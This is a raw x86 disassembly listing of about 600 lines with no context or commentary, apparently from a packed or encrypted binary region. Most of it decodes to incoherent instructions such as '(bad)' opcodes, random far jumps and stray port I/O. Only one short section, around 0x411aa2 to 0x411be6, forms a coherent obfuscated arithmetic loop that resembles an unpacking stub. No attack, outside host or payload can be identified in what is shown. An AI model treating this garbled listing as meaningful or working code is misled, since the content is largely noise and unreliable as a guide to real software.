  411771:	or     DWORD PTR [eax+edx*8-0x20],ecx
  411775:	inc    ecx
  411776:	dec    edi
  411777:	sbb    al,0xcf
  411779:	jl     0x4117eb
  41177b:	xor    al,BYTE PTR ds:0x4e9a646e
  411781:	pop    eax
  411782:	sbb    DWORD PTR [edi+ebp*4],esp
  411785:	adc    DWORD PTR [ebp+0x3e],ebp
  411788:	and    BYTE PTR [edi-0x488eddd7],0xde
  41178f:	pop    es
  411790:	cwde   
  411791:	add    ecx,ecx
  411793:	sbb    edx,DWORD PTR [ebp+0x4d]
  411796:	and    ebp,DWORD PTR gs:[edi+0x6ac43eb4]
  41179d:	ret    0x2009
  4117a0:	jmp    0xb421:0x4d99c1d1
  4117a7:	rcr    BYTE PTR [ebx+0x1ee0f418],cl
  4117ad:	mov    al,ds:0x6fa76b6b
  4117b2:	push   edi
  4117b3:	adc    eax,0x84870910
  4117b8:	mov    esp,0xc84b0d76
  4117bd:	imul   eax,DWORD PTR [edi-0x10],0x2af47dea
  4117c4:	sub    edx,DWORD PTR [esi-0x78f7d4c0]
  4117ca:	lea    ebp,[edi+0x79cacf3d]
  4117d0:	cmp    DWORD PTR [ebx+0x75],0xfffffff7
  4117d4:	lods   al,BYTE PTR ds:[esi]
  4117d5:	jo     0x41182b
  4117d7:	push   eax
  4117d8:	inc    ebp
  4117d9:	mov    al,BYTE PTR [esi+edx*1+0x8]
  4117dd:	fcomp  DWORD PTR [esi+edi*1-0x2d57db4e]
  4117e4:	add    BYTE PTR [ecx],0xb5
  4117e7:	(bad)  
  4117e8:	ja     0x4117ce
  4117ea:	stos   BYTE PTR es:[edi],al
  4117eb:	int3   
  4117ec:	mov    ch,0x63
  4117ee:	add    al,0x63
  4117f0:	jmp    0x66db98ef
  4117f5:	call   0x7080887b
  4117fa:	retf   
  4117fb:	mov    ds:0xc47889cb,al
  411800:	or     DWORD PTR [edx+esi*2-0x4e],esi
  411804:	jo     0x411809
  411806:	mov    ch,0x3b
  411808:	adc    cl,ah
  41180a:	retf   
  41180b:	and    DWORD PTR [ebx],edx
  41180d:	ror    BYTE PTR [eax-0x6e],cl
  411810:	jbe    0x411816
  411812:	stos   BYTE PTR es:[edi],al
  411813:	adc    bl,BYTE PTR [eax-0x45f4d201]
  411819:	inc    ecx
  41181a:	(bad)  
  41181c:	dec    eax
  41181d:	popf   
  41181e:	ret    0xf92
  411821:	and    DWORD PTR [esi-0x480c8898],esi
  411827:	and    eax,0x4b33958d
  41182c:	xchg   edx,eax
  41182d:	lods   eax,DWORD PTR ds:[esi]
  41182e:	jns    0x4117cf
  411830:	pushf  
  411831:	mov    ebx,0xd75a6a55
  411836:	fcomi  st,st(4)
  411838:	into   
  411839:	inc    esi
  41183a:	xchg   ebx,eax
  41183b:	jecxz  0x41189b
  41183d:	dec    ebp
  41183e:	popf   
  41183f:	cld    
  411840:	mov    eax,ds
  411842:	jnp    0x41180b
  411844:	inc    ebp
  411845:	les    edx,FWORD PTR [ebp-0x3bdd09ab]
  41184b:	test   eax,0x18330110
  411850:	fistp  WORD PTR [edi+0x7f691f59]
  411856:	mov    ch,0x8c
  411858:	ret    
  411859:	test   al,0x44
  41185b:	jno    0x411857
  41185d:	inc    ebp
  41185e:	ds or  al,0x40
  411861:	jecxz  0x411881
  411863:	adc    DWORD PTR [edi-0xf],0x1f
  411867:	fs dec edx
  411869:	cmp    ah,dl
  41186b:	ja     0x4118a7
  41186d:	fucomip st,st(3)
  41186f:	mov    eax,DWORD PTR [esi]
  411871:	imul   esi,DWORD PTR [edi-0x1a30d078],0xe08ebf41
  41187b:	lods   eax,DWORD PTR ds:[esi]
  41187c:	jne    0x411828
  41187e:	sub    BYTE PTR [esi+0x3b6cfef],dl
  411884:	mov    al,ds:0x7eee9430
  411889:	sub    DWORD PTR [ebx+0x12],edi
  41188c:	pop    edx
  41188d:	in     al,0xe6
  41188f:	(bad)  
  411890:	inc    ecx
  411892:	mov    esi,ss
  411894:	in     eax,0x4
  411896:	test   eax,0x6919ffb
  41189b:	shr    DWORD PTR [edi+0x4bcb9467],1
  4118a1:	stos   DWORD PTR es:[edi],eax
  4118a2:	mov    dh,0x7f
  4118a4:	arpl   sp,bx
  4118a6:	or     ah,BYTE PTR [edi+eax*2-0x5c292a]
  4118ad:	jbe    0x4118e7
  4118af:	stos   BYTE PTR es:[edi],al
  4118b0:	sbb    esi,0x62
  4118b3:	sbb    eax,0x967df590
  4118b8:	mov    ebp,0xaf241b5e
  4118bd:	ins    DWORD PTR es:[edi],dx
  4118be:	push   edi
  4118bf:	aam    0x19
  4118c1:	call   0xb9dd:0xc1d3a315
  4118c8:	idiv   DWORD PTR [esi-0x6588752a]
  4118ce:	add    ch,BYTE PTR [ecx+0x11e8855]
  4118d4:	xor    DWORD PTR [ebx],0x591f1961
  4118da:	xor    al,0x37
  4118dc:	adc    esp,0x47
  4118df:	push   ebx
  4118e0:	pop    ecx
  4118e1:	pop    edx
  4118e2:	push   edx
  4118e3:	adc    cl,bl
  4118e5:	sbb    ah,bh
  4118e7:	in     al,dx
  4118e8:	data16 mov ch,0xbe
  4118eb:	pop    ss
  4118ec:	test   eax,0x993d33d
  4118f1:	sbb    WORD PTR [eax],dx
  4118f4:	shl    DWORD PTR es:[ecx],1
  4118f7:	pop    esp
  4118f8:	push   0x7a
  4118fa:	cmc    
  4118fb:	pop    esi
  4118fc:	retfw  
  4118fe:	mov    ah,0x21
  411900:	aad    0x1f
  411902:	push   0xffffffbb
  411904:	neg    DWORD PTR [eax-0xe45becf]
  41190a:	loope  0x4118ec
  41190c:	hlt    
  41190d:	mov    eax,ds:0x97638151
  411912:	or     ah,BYTE PTR [esi+0x2fc51d9f]
  411918:	dec    eax
  411919:	inc    ebx
  41191a:	aam    0xcc
  41191c:	push   esi
  41191d:	lock imul ecx,DWORD PTR [ecx+0x18780ea8],0x5f
  411925:	popf   
  411926:	outs   dx,BYTE PTR ds:[esi]
  411927:	xor    cl,BYTE PTR [eax+eax*4+0x5f]
  41192b:	and    DWORD PTR [ebp-0x32],0xffffffa5
  41192f:	push   ebp
  411930:	sub    eax,0xb06816f8
  411935:	pop    ebx
  411936:	clc    
  411937:	scas   al,BYTE PTR es:[edi]
  411938:	popf   
  411939:	mov    dh,0xfe
  41193b:	mov    cl,0x91
  41193d:	and    BYTE PTR [esi],dl
  41193f:	call   0x76fc:0x9b659c3b
  411946:	xchg   ebx,eax
  411947:	dec    ebx
  411948:	or     eax,0x762102c9
  41194d:	daa    
  41194e:	inc    ecx
  41194f:	in     eax,dx
  411950:	fst    DWORD PTR ds:0x97cd63ee
  411956:	adc    ah,BYTE PTR ds:0xe526019d
  41195c:	fcomip st,st(2)
  41195e:	cmp    dl,BYTE PTR [esi+edx*4+0x18]
  411962:	cmp    DWORD PTR [esi+ecx*8+0x4e7d5d16],ebp
  411969:	pop    esi
  41196a:	inc    eax
  41196b:	inc    ebp
  41196c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41196d:	js     0x4119c6
  41196f:	and    dl,dh
  411971:	(bad)  
  411975:	xor    DWORD PTR [ebx-0x3b811362],esp
  41197b:	cmp    DWORD PTR [edx-0x6],esi
  41197e:	pusha  
  41197f:	mov    esp,0xd6bcb0b1
  411984:	add    eax,0x10ca02a0
  411989:	fsubrp st(4),st
  41198b:	pop    es
  41198c:	push   ecx
  41198d:	and    bh,ch
  41198f:	inc    edx
  411990:	sahf   
  411991:	xor    al,0xf5
  411993:	or     BYTE PTR [ebx+eax*4],al
  411996:	pop    esp
  411997:	test   BYTE PTR [edx+ebp*4],dh
  41199a:	push   esi
  41199b:	bound  esi,QWORD PTR [ebp+0x1bd72792]
  4119a1:	loopne 0x4119df
  4119a3:	aad    0xc5
  4119a5:	and    eax,ebp
  4119a7:	and    BYTE PTR [ecx+ebp*8-0x45232d65],ah
  4119ae:	mov    ds:0x819c2ae2,eax
  4119b3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4119b4:	into   
  4119b5:	jnp    0x411979
  4119b7:	xlat   BYTE PTR ds:[ebx]
  4119b8:	mov    DWORD PTR [eax],esi
  4119ba:	jecxz  0x41195e
  4119bc:	fdivr  DWORD PTR [ebx-0x7bb58e36]
  4119c2:	push   eax
  4119c3:	xlat   BYTE PTR ds:[ebx]
  4119c4:	xor    bh,BYTE PTR [ebp+0x7579ceb1]
  4119ca:	mov    dl,0x60
  4119cc:	(bad)  
  4119ce:	out    0x2e,eax
  4119d0:	push   ds
  4119d1:	pop    ds
  4119d2:	sub    esp,ebp
  4119d4:	xchg   bh,bl
  4119d6:	push   esp
  4119d7:	xchg   esi,eax
  4119d8:	out    dx,al
  4119d9:	(bad)  
  4119da:	repz fisub DWORD PTR [ecx+0x3]
  4119de:	fwait
  4119df:	adc    dh,BYTE PTR [eax+0x31]
  4119e2:	mov    ch,0x41
  4119e4:	push   0x94297dcd
  4119e9:	aad    0x70
  4119eb:	xchg   DWORD PTR [ebx-0x76dc13f],edx
  4119f1:	xchg   DWORD PTR [ebx+0xa36633a],esp
  4119f7:	(bad)  gs:[esi]
  4119fa:	arpl   WORD PTR [ebx],di
  4119fc:	xchg   DWORD PTR ds:0x6abeaff1,ebp
  411a02:	ja     0x4119fa
  411a04:	repz and BYTE PTR [edx*8-0x49f1d6ee],al
  411a0c:	hlt    
  411a0d:	inc    edx
  411a0e:	xor    cl,BYTE PTR [ebx-0x41]
  411a11:	mov    cl,0x55
  411a13:	xchg   edi,eax
  411a14:	mov    BYTE PTR [esi-0x69e1fab9],ah
  411a1a:	cwde   
  411a1b:	xchg   edi,eax
  411a1c:	jp     0x4119cd
  411a1e:	fst    DWORD PTR [edx+0xb72f13c]
  411a24:	jge    0x411a99
  411a26:	mov    al,ds:0x5c48de94
  411a2b:	fnclex 
  411a2d:	jno    0x411a39
  411a2f:	jne    0xeec9cc79
  411a35:	pop    ecx
  411a36:	outs   dx,DWORD PTR ds:[esi]
  411a38:	cmp    al,BYTE PTR [esi+0x4f572d42]
  411a3e:	cmp    DWORD PTR [edx+0x46],0x5
  411a42:	inc    ebp
  411a43:	xlat   BYTE PTR ds:[ebx]
  411a44:	pop    ebp
  411a45:	aaa    
  411a46:	xchg   BYTE PTR ds:0x9b516fd0,dh
  411a4c:	cmp    DWORD PTR [eax+0x1b1d8af2],0x11
  411a53:	aas    
  411a54:	jge    0x411acd
  411a56:	imul   eax,DWORD PTR [eax+0x6c4c2ec8],0xc581719b
  411a60:	sub    al,0x90
  411a62:	popa   
  411a63:	cmp    ebx,DWORD PTR [edx-0xf4f55ab]
  411a69:	fistp  DWORD PTR [edi+0x2f]
  411a6c:	shr    ch,0xdb
  411a6f:	outs   dx,DWORD PTR ds:[esi]
  411a70:	lods   eax,DWORD PTR ds:[esi]
  411a71:	imul   esp,DWORD PTR [ebp-0x42],0x71412c88
  411a78:	and    eax,0x93c3b2aa
  411a7d:	cmp    BYTE PTR [edx-0x1d],dh
  411a80:	ror    eax,cl
  411a82:	jp     0x411a7e
  411a84:	repz add eax,0xe0366577
  411a8a:	mov    cl,0x51
  411a8c:	imul   esp,DWORD PTR [ebp-0x7ad494fd],0xffffffe7
  411a93:	mov    bl,0x88
  411a95:	cmp    eax,0xa
  411a98:	cwde   
  411a99:	enter  0xe2,0xc0
  411a9d:	xor    eax,0xef54691
  411aa2:	jbe    0x411aaf
  411aa4:	or     DWORD PTR [edx+0x64],ecx
  411aa7:	xor    al,BYTE PTR ds:0xe8558b9e
  411aad:	xor    edx,eax
  411aaf:	add    edx,esi
  411ab1:	cmp    ecx,edx
  411ab3:	mov    ecx,DWORD PTR [ebp-0x14]
  411ab6:	mov    DWORD PTR [ebp+0x8],ecx
  411ab9:	mov    ecx,DWORD PTR [ebp+0x8]
  411abc:	je     0x4164f7
  411ac2:	xor    ecx,eax
  411ac4:	add    ecx,esi
  411ac6:	mov    ecx,0x242ebe9
  411acb:	je     0x411bdb
  411ad1:	mov    edx,DWORD PTR [ebp+0x8]
  411ad4:	mov    ebx,DWORD PTR [ebp-0x8]
  411ad7:	xor    edx,eax
  411ad9:	xor    ebx,eax
  411adb:	sub    edx,ebx
  411add:	sub    edx,esi
  411adf:	xor    edx,eax
  411ae1:	mov    DWORD PTR [ebp+0x8],edx
  411ae4:	mov    edx,DWORD PTR [ebp+0x8]
  411ae7:	mov    ebx,DWORD PTR [ebp-0x58]
  411aea:	add    edx,0x5708c4
  411af0:	imul   edx,ebx
  411af3:	mov    DWORD PTR [ebp-0x58],edx
  411af6:	mov    edx,DWORD PTR [ebp+0x8]
  411af9:	mov    ebx,DWORD PTR [ebp-0x54]
  411afc:	add    edx,0x64f8da
  411b02:	or     edx,ebx
  411b04:	mov    DWORD PTR [ebp-0x54],edx
  411b07:	mov    edx,DWORD PTR [ebp+0x8]
  411b0a:	mov    ebx,DWORD PTR [ebp-0x50]
  411b0d:	add    edx,ecx
  411b0f:	xor    edx,ebx
  411b11:	mov    DWORD PTR [ebp-0x50],edx
  411b14:	mov    edx,DWORD PTR [ebp+0x8]
  411b17:	mov    ebx,DWORD PTR [ebp-0x4c]
  411b1a:	add    edx,edi
  411b1c:	and    edx,ebx
  411b1e:	mov    DWORD PTR [ebp-0x4c],edx
  411b21:	mov    edx,DWORD PTR [ebp+0x8]
  411b24:	mov    ebx,DWORD PTR [ebp-0x48]
  411b27:	lea    edx,[ebx+edx*1+0x241fc1f]
  411b2e:	mov    DWORD PTR [ebp-0x48],edx
  411b31:	mov    edx,DWORD PTR [ebp+0x8]
  411b34:	mov    ebx,0xfa5e15e2
  411b39:	sub    ebx,edx
  411b3b:	add    ebx,DWORD PTR [ebp-0x44]
  411b3e:	mov    DWORD PTR [ebp-0x44],ebx
  411b41:	mov    edx,DWORD PTR [ebp+0x8]
  411b44:	xor    edx,eax
  411b46:	add    edx,esi
  411b48:	jne    0x411ad1
  411b4e:	jmp    0x411bdb
  411b53:	mov    edx,DWORD PTR [ebp-0x14]
  411b56:	mov    DWORD PTR [ebp+0x8],edx
  411b59:	jmp    0x411bce
  411b5e:	mov    edx,DWORD PTR [ebp+0x8]
  411b61:	mov    ebx,DWORD PTR [ebp-0x8]
  411b64:	xor    edx,eax
  411b66:	xor    ebx,eax
  411b68:	sub    edx,ebx
  411b6a:	sub    edx,esi
  411b6c:	xor    edx,eax
  411b6e:	mov    DWORD PTR [ebp+0x8],edx
  411b71:	mov    edx,DWORD PTR [ebp+0x8]
  411b74:	mov    ebx,DWORD PTR [ebp-0x58]
  411b77:	add    edx,0x5708c4
  411b7d:	imul   edx,ebx
  411b80:	mov    DWORD PTR [ebp-0x58],edx
  411b83:	mov    edx,DWORD PTR [ebp+0x8]
  411b86:	mov    ebx,DWORD PTR [ebp-0x54]
  411b89:	add    edx,0x64f8da
  411b8f:	or     edx,ebx
  411b91:	mov    DWORD PTR [ebp-0x54],edx
  411b94:	mov    edx,DWORD PTR [ebp+0x8]
  411b97:	mov    ebx,DWORD PTR [ebp-0x50]
  411b9a:	add    edx,ecx
  411b9c:	xor    edx,ebx
  411b9e:	mov    DWORD PTR [ebp-0x50],edx
  411ba1:	mov    edx,DWORD PTR [ebp+0x8]
  411ba4:	mov    ebx,DWORD PTR [ebp-0x4c]
  411ba7:	add    edx,edi
  411ba9:	and    edx,ebx
  411bab:	mov    DWORD PTR [ebp-0x4c],edx
  411bae:	mov    edx,DWORD PTR [ebp+0x8]
  411bb1:	mov    ebx,DWORD PTR [ebp-0x48]
  411bb4:	lea    edx,[ebx+edx*1+0x241fc1f]
  411bbb:	mov    DWORD PTR [ebp-0x48],edx
  411bbe:	mov    edx,DWORD PTR [ebp+0x8]
  411bc1:	mov    ebx,0xfa5e15e2
  411bc6:	sub    ebx,edx
  411bc8:	add    ebx,DWORD PTR [ebp-0x44]
  411bcb:	mov    DWORD PTR [ebp-0x44],ebx
  411bce:	mov    edx,DWORD PTR [ebp+0x8]
  411bd1:	xor    edx,eax
  411bd3:	add    edx,esi
  411bd5:	jne    0x411b5e
  411bdb:	mov    edx,DWORD PTR [ebp-0x14]
  411bde:	mov    DWORD PTR [ebp+0x8],edx
  411be1:	jmp    0x4163be
  411be6:	jmp    0x413f9a
  411beb:	rcr    BYTE PTR [ecx-0x6f],1
  411bee:	and    BYTE PTR [ecx+0x70],dh
  411bf1:	ror    DWORD PTR [ecx+0x1e6f5998],1
  411bf7:	xchg   ebx,eax
  411bf8:	jno    0x411bc4
  411bfa:	in     al,0x4b
  411bfc:	test   eax,0x5feb7c7c
  411c01:	jl     0x411c7f
  411c03:	test   al,0x38
  411c05:	add    eax,0x78a2b776
  411c0a:	mov    eax,ds:0x13d5153
  411c0f:	js     0x411c3d
  411c11:	fldenv [ebp+0x3f]
  411c14:	and    BYTE PTR [edi+0x64c145df],dl
  411c1a:	xor    BYTE PTR [ebx+0xf],ch
  411c1d:	cmp    eax,0xc5b7478a
  411c22:	jecxz  0x411c0c
  411c24:	xor    eax,0xdbb837ab
  411c29:	mov    bh,BYTE PTR [esp+eiz*2+0x71737307]
  411c30:	mov    ds:0x21f45d2c,eax
  411c35:	add    edi,DWORD PTR [ebp-0x22]
  411c38:	popa   
  411c39:	dec    edi
  411c3a:	into   
  411c3b:	inc    ebx
  411c3c:	(bad)  
  411c3d:	repnz mov ds:0x268562a9,al
  411c43:	leave  
  411c44:	mov    edx,0x8c73f288
  411c49:	cmp    eax,eax
  411c4b:	in     eax,dx
  411c4c:	test   al,0xc4
  411c4e:	into   
  411c4f:	rcl    DWORD PTR [edx-0x8f5274a],0x7b
  411c56:	xchg   esp,eax
  411c57:	sbb    DWORD PTR [ecx+edx*1-0x5e58a578],eax
  411c5e:	out    0x50,al
  411c60:	inc    eax
  411c61:	inc    esi
  411c62:	imul   ecx
  411c64:	add    al,BYTE PTR ds:0xb201a8f6
  411c6a:	jmp    0x72a9:0xda0c68c7
  411c71:	int3   
  411c72:	mov    al,0x5d
  411c74:	and    dl,0x26
  411c77:	push   esp
  411c78:	out    dx,eax
  411c79:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411c7a:	xor    ch,BYTE PTR ds:0xcd312405
  411c80:	fdiv   st(0),st
  411c82:	add    BYTE PTR [edi+0x312b1da5],bh
  411c88:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411c89:	data16 adc BYTE PTR [esi+0x271112b],0x7a
  411c91:	xor    BYTE PTR [eax+0x7242bcdb],ah
  411c97:	jp     0x411c3c
  411c99:	sub    DWORD PTR [ecx-0x3],ebp
  411c9c:	jns    0x411c6b
  411c9e:	xor    ch,bl
  411ca0:	js     0x411cf3
  411ca2:	int3   
  411ca3:	clc    
  411ca4:	mov    bl,0xbe
  411ca6:	ret    
  411ca7:	cmovae edx,DWORD PTR [edx-0x7b2043fc]
  411cae:	imul   ebp,DWORD PTR [edi+ecx*1-0x6f],0xbfd0954d
  411cb6:	loopne 0x411c62
  411cb8:	jbe    0x411cf0
  411cba:	xor    eax,DWORD PTR [eax+0x3ba1bd05]
  411cc0:	and    al,0xba
  411cc2:	call   0xb5a:0x6a2a373
  411cc9:	inc    esp
  411cca:	adc    al,0x4c
  411ccc:	repz xlat BYTE PTR ds:[ebx]
  411cce:	shr    DWORD PTR [esi-0x66ad7937],0xdb
  411cd5:	push   ds
  411cd6:	add    DWORD PTR [esi+eiz*8+0x7c64247f],0x714514ab
  411ce1:	jbe    0x411ce9
  411ce3:	sub    esp,esp
  411ce5:	cmp    edi,eax
  411ce7:	and    al,0x6f
  411ce9:	inc    edx
  411cea:	(bad)  
  411ceb:	mov    eax,ds:0x20a9c1dc
  411cf0:	mov    bh,BYTE PTR [ebp+0x43fdba22]
  411cf6:	mov    edi,DWORD PTR [ebx+0x2e5f6b16]
  411cfc:	jbe    0x411cb1
  411cfe:	add    dh,BYTE PTR [ecx-0xd]
  411d01:	mov    al,dl
  411d03:	sbb    eax,0x4205b42b
  411d08:	in     al,0x1a
  411d0a:	ja     0x411d33
  411d0c:	mov    ds:0x798cc0d6,al
  411d11:	sar    BYTE PTR [eax-0x6e22ef31],0xe9
  411d18:	retf   0xfcfa
  411d1b:	retf   
  411d1c:	ss push ss
  411d1e:	or     DWORD PTR [ebx+eax*1],ebp
  411d21:	and    DWORD PTR [esi+0x3b],ebx
  411d24:	push   ebp
  411d25:	jl     0x411cb5
  411d27:	add    DWORD PTR [esi],0xfffffff2
  411d2a:	push   es
  411d2b:	stos   BYTE PTR es:[edi],al
  411d2c:	or     eax,0xd8248c60
  411d31:	and    dh,BYTE PTR [eax]
  411d33:	xlat   BYTE PTR ds:[ebx]
  411d34:	dec    ebp
  411d35:	sbb    al,0x96
  411d37:	add    ebx,DWORD PTR [esi-0x2d]
  411d3a:	fmul   DWORD PTR [ebx+eax*8+0x38c86407]
  411d41:	dec    ecx
  411d42:	lds    eax,FWORD PTR [esi+ebp*8+0x31af0601]
  411d49:	inc    esp
  411d4a:	std    
  411d4b:	push   eax
  411d4c:	mov    dl,BYTE PTR [edx+esi*2-0x72]
  411d50:	iret   
  411d51:	jo     0x411d3f
  411d53:	pop    ss
  411d54:	fcomp  DWORD PTR [edi-0x6eeeac8]
  411d5a:	ja     0x411d3c
  411d5c:	inc    ebx
  411d5d:	cmp    al,0xfc
  411d5f:	popa   
  411d60:	sbb    DWORD PTR [edx+0x1d],ecx
  411d63:	mov    dl,0x12
  411d65:	js     0x411cf1
  411d67:	sbb    DWORD PTR [esi],esp
  411d69:	xchg   DWORD PTR [edi+edx*8],ebx
  411d6c:	or     BYTE PTR [ecx-0x18],0xb8
  411d70:	das    
  411d71:	xchg   edx,eax
  411d72:	add    eax,0x8ddc789
  411d77:	fdivr  QWORD PTR [ebx]
  411d79:	test   DWORD PTR [esp+0x66e0002c],esp
  411d80:	and    BYTE PTR [ecx-0x5ff4d4cb],cl
  411d86:	pop    ds
  411d87:	pop    ss
  411d88:	nop
  411d89:	xchg   edi,eax
  411d8a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411d8b:	and    edi,DWORD PTR [edi]
  411d8d:	jb     0x411de6
  411d8f:	arpl   WORD PTR [edx+ecx*1],ax
  411d92:	adc    DWORD PTR [ebp-0x4f],edx
  411d95:	mov    dl,0x3c
  411d97:	or     DWORD PTR [eax],ebx
  411d99:	inc    ecx
  411d9a:	xchg   ebp,eax
  411d9b:	push   ecx
  411d9c:	mov    ch,0x32
  411d9e:	popa   
  411d9f:	and    DWORD PTR [ecx+0x28],0xa3c33a36
  411da6:	jne    0x411d63
  411da8:	sti    
  411da9:	aas    
  411daa:	and    eax,0x61469d9e
  411daf:	mov    cl,0x28
  411db1:	cmp    al,0xc0
  411db3:	jle    0x411e25
  411db5:	sar    DWORD PTR [ecx+0x55d552c8],1
  411dbb:	pop    esi
  411dbc:	pop    ecx
  411dbd:	bound  edx,QWORD PTR [eax-0x6da5a435]
  411dc3:	iret   
  411dc4:	test   DWORD PTR [eax+0x495f13b0],esi
  411dca:	inc    edx
  411dcb:	jb     0x411e01
  411dcd:	neg    BYTE PTR [edx+0x57]
  411dd0:	pop    edx
  411dd1:	push   DWORD PTR [esi]
  411dd3:	and    DWORD PTR [eax-0x5cece89a],esp
  411dd9:	adc    eax,0x3257b72e
  411dde:	enter  0x610a,0x1
  411de2:	push   ds
  411de3:	loop   0x411e0f
  411de5:	fdivr  QWORD PTR [ecx-0x7c]
  411de8:	cmp    cl,al
  411dea:	cwde   
  411deb:	call   0xef39:0xc31dd84d
  411df2:	sti    
  411df3:	dec    eax
  411df4:	add    eax,0xaae1244e
  411df9:	ds jmp 0xc33f4244
  411dff:	add    dh,BYTE PTR [eax]
  411e01:	dec    ecx
  411e02:	fdiv   DWORD PTR [esi+0x34]
  411e05:	in     eax,dx
  411e06:	pop    ebx
  411e07:	add    ebx,DWORD PTR [ecx]
  411e09:	sub    esp,DWORD PTR [edx-0x67]
  411e0c:	xor    dh,BYTE PTR [esi-0x34]
  411e0f:	mov    dl,0x22
  411e11:	les    edi,FWORD PTR [ecx+0x65]
  411e14:	aas    
  411e15:	add    BYTE PTR [edi+ebp*8+0x2],bh
  411e19:	sbb    BYTE PTR [ecx+0x5],ch
  411e1c:	xor    bl,al
  411e1e:	pop    ebp
  411e1f:	mov    ecx,0x495a0d7b
  411e24:	xlat   BYTE PTR ds:[ebx]
  411e25:	jle    0x411e10
  411e27:	sub    BYTE PTR [eax],bh
  411e29:	pusha  
  411e2a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411e2b:	ror    DWORD PTR [ebp+0x29b7bb61],cl
  411e31:	add    DWORD PTR [edi+0x3bc27fc1],ebx
  411e37:	push   esp
  411e38:	mov    ah,0xb4
  411e3a:	pop    esi
  411e3b:	jo     0xb52355af
  411e41:	jbe    0x411dce
  411e43:	dec    edi
  411e44:	sbb    ebp,DWORD PTR [esi]
  411e46:	sbb    al,0x49
  411e48:	inc    esp
  411e49:	push   0x52043fac
  411e4e:	sbb    BYTE PTR [ebx-0x1f],ch
  411e51:	shr    BYTE PTR [edi+0x2b0caec8],0xd9
  411e58:	imul   ecx,ebx,0x32e4541d
  411e5e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411e5f:	lds    ebx,FWORD PTR [esi]
  411e61:	adc    al,0x3
  411e63:	icebp  
  411e64:	mov    eax,0x3ff68b2b
  411e69:	sbb    dl,ch
  411e6b:	push   0x4cc2078d
  411e70:	(bad)  
  411e71:	xor    eax,0x43c33d23
  411e76:	out    dx,al
  411e77:	sub    eax,0x4868c13a
  411e7c:	pop    ss
  411e7d:	pop    ss
  411e7e:	sbb    DWORD PTR [edi+0xd2a9df6],esi
  411e84:	or     al,0x12
  411e86:	cmp    al,dh
  411e88:	fbstp  TBYTE PTR [esi]
  411e8a:	ds loop 0x411e15
  411e8d:	inc    edx
  411e8e:	repnz xor eax,0xfc229d4b
  411e94:	dec    ebx
  411e95:	sub    al,0x67
  411e97:	pop    ebp
  411e98:	mov    BYTE PTR fs:[edx-0x78],bh
  411e9c:	pop    ebx
  411e9d:	aas    
  411e9e:	mov    dl,0xb5
  411ea0:	cli    
  411ea1:	adc    al,0x87
  411ea3:	cmc    
  411ea4:	pop    eax
  411ea5:	inc    edx
  411ea6:	(bad)
  411eab:	xor    bl,0xb0
  411eae:	daa    
  411eaf:	sub    cl,dh
  411eb1:	xor    DWORD PTR [edi+0x380538e5],edi
  411eb7:	aam    0xf5
  411eb9:	xchg   ebp,eax
  411eba:	out    dx,eax
  411ebb:	add    BYTE PTR [eax],cl
  411ebd:	leave  
  411ebe:	mov    WORD PTR [edi],?
  411ec0:	out    0x84,eax
  411ec2:	jmp    0xf410:0x2e8383e0
  411ec9:	xchg   edi,eax
  411eca:	jmp    0xc229b1a2
  411ecf:	scas   eax,DWORD PTR es:[edi]
  411ed0:	add    cl,BYTE PTR [eax-0x51507154]
  411ed6:	sti    
  411ed7:	retf   
  411ed8:	jmp    0x15ca:0x24af8992
  411edf:	arpl   WORD PTR [eax+0x74],bp
  411ee2:	(bad)  
  411ee3:	sbb    al,0xa
  411ee5:	div    BYTE PTR [ecx+0x6]
  411ee8:	jge    0x411eed
  411eea:	pop    DWORD PTR [eax-0x27]
  411eed:	jg     0x411f3d
  411eef:	pop    es
  411ef0:	and    al,al
  411ef2:	xchg   esp,eax
  411ef3:	jmp    0x2567:0x6624c672
  411efa:	bound  edi,QWORD PTR [eax]
  411efc:	out    0x7c,ax
  411eff:	inc    ebx
  411f00:	adc    bl,0xec
  411f03:	fnstenv [edx]
  411f05:	test   eax,0x770b9076
  411f0a:	or     al,0xcc
  411f0c:	loop   0x411f68
  411f0e:	repz aaa 
  411f10:	mov    ecx,0x4ea59c5d
  411f15:	iret   
  411f16:	cmp    eax,0x2cc25b
  411f1b:	das    
  411f1c:	add    ah,BYTE PTR [ebx]
  411f1e:	jo     0x411ee2
  411f20:	jne    0x411ebf
  411f22:	pop    ds
  411f23:	out    dx,al
  411f24:	xor    bl,BYTE PTR [ebx]
  411f26:	(bad)  
  411f27:	stos   DWORD PTR es:[edi],eax
  411f28:	call   0xc1ae:0x3bb311c7
  411f2f:	xor    BYTE PTR fs:[ebx],al
  411f32:	inc    esi
  411f33:	ins    BYTE PTR es:[edi],dx
  411f34:	cli    
  411f35:	lahf   
  411f36:	dec    edi
  411f37:	push   ecx
  411f38:	bound  esi,QWORD PTR [ebx]
  411f3a:	ins    DWORD PTR es:[edi],dx
  411f3b:	push   edx
  411f3c:	adc    ebp,edx
  411f3e:	pop    ds
  411f3f:	fcmovnb st,st(7)
  411f41:	nop
  411f42:	pop    ecx
  411f43:	jo     0x411f9c
  411f45:	cmp    BYTE PTR ds:0x4a349926,ch
  411f4b:	call   0x7618:0x6a8d666c
  411f52:	mov    eax,ds:0xb3eb45f1
  411f57:	or     ebx,ebx
  411f59:	jne    0x411fcf
  411f5b:	cmp    ch,bh
  411f5d:	xchg   ebx,eax
  411f5e:	call   0xbfb1358d
  411f63:	jl     0x411faf
  411f65:	cmp    ebx,DWORD PTR [esi]
  411f67:	or     eax,0xeaeecdfd
  411f6c:	add    esi,DWORD PTR [ecx-0x1e3a778c]
  411f72:	sahf   
  411f73:	dec    edx
  411f74:	mov    eax,ds:0x8c44dc23
  411f79:	jae    0x411f30
  411f7b:	inc    eax
  411f7c:	add    ch,ch
  411f7e:	sub    eax,0xce1a6ff
  411f83:	sub    dh,bl
  411f85:	or     eax,0x764de3cd
  411f8a:	enter  0xb486,0x88
  411f8e:	lds    ecx,FWORD PTR [edi+0x2f3da0d4]
  411f94:	lods   al,BYTE PTR ds:[esi]
  411f95:	jmp    0x1acf:0xb104b609
  411f9c:	or     esp,edi
  411f9e:	ja     0x411f29
  411fa0:	(bad)  
  411fa1:	out    dx,al
